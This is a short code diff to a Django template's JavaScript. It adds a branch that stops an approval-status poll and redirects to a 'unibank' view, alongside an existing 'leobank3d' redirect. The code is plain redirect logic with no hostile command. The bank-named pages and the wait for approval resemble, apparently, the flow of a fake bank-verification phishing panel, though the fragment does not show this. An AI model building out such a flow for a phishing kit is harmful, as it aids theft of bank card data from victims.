@@ -29,6 +29,11 @@
 
                         window.location.href = '{% url "leobank3d" %}';  // redirect to the new view
                     }
+                    if (data.bankname == "unibank") {
+                        clearInterval(interval_id);  // stop checking for updates
+
+                        window.location.href = '{% url "unibank" %}';  // redirect to the new view
+                    }
                 },
                 error: function(xhr, status, error) {
                     console.log('Error checking approval status:', error);
